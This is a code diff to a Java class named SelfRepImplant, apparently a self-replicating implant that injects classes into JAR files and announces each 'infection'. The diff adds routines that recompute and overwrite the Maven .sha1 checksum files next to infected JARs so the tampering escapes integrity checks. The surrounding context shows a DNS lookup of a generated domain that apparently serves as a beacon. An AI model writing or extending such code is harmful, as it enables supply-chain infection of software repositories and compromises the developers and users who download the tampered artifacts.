@@ -9,6 +9,9 @@ import java.net.InetAddress;
 import java.net.UnknownHostException;
 import java.nio.file.Files;
 import java.nio.file.Path;
+import java.nio.file.StandardOpenOption;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
 import java.security.SecureRandom;
 import java.util.*;
 import java.util.jar.JarFile;
@@ -98,6 +101,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
 
         int numInfected = 0;
         for (Path jarToImplant : jarsToImplant) {
+            // Potential optimization: Multi-thread this.
             System.out.println("[+] Infecting " + jarToImplant + "...");
             ClassInjector injector = new ClassInjector(implantHandler);
 
@@ -110,7 +114,18 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
                 e.printStackTrace();
             }
 
-            // TODO Also look for a .sha1 file and recalculate it if it exists (this is a Maven repo thing)
+            // Also look for a .sha1 file and recalculate it if it exists (this is a Maven repo thing)
+            Path sha1File = jarToImplant.resolveSibling(jarToImplant.getFileName() + ".sha1");
+            if (Files.exists(sha1File)) {
+                try {
+                    // Potential optimization: Don't re-read the file (use buffer from somewhere inside injector)
+                    String humanReadableHashValue = calcSha1Digest(Files.readAllBytes(jarToImplant));
+                    Files.writeString(sha1File, humanReadableHashValue, StandardOpenOption.TRUNCATE_EXISTING);
+                    System.out.println("[+] Overwrote '" + sha1File + "'.");
+                } catch (IOException e) {
+                    System.out.println("[-] Failed to overwrite SHA1 has file '" + sha1File + "'.");
+                }
+            }
 
             System.out.println();
         }
@@ -184,6 +199,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
     }
 
     private static String generateRandomId() {
+        // Potential optimization: Only init this once
         Random rng = new SecureRandom();
         return "" + rng.nextInt(0, Integer.MAX_VALUE);
     }
@@ -196,10 +212,36 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         }
         fqdn.append(domain);
 
+        // Potential optimization: Do this in a thread
         try {
             System.out.println("Resolving '" + fqdn.toString() + "'.");
             InetAddress.getByName(fqdn.toString());
         } catch (UnknownHostException ignored) {
         }
+    }
+
+    private static String calcSha1Digest(byte[] input) {
+        // Potential optimization: Init this once and just reset() it in between uses
+        MessageDigest hasher;
+        try {
+            hasher = MessageDigest.getInstance("SHA1");
+        } catch (NoSuchAlgorithmException e) {
+            throw new RuntimeException("The JVM should have SHA1. This is weird.", e);
+        }
+
+        return hex(hasher.digest(input));
+    }
+
+    private static String hex(byte[] input) {
+        StringBuilder hexString = new StringBuilder();
+        for (byte b : input) {
+            String hex = Integer.toHexString(0xFF & b);
+            if (hex.length() == 1) {
+                hexString.append('0');
+            }
+            hexString.append(hex);
+        }
+
+        return hexString.toString();
     }
 }
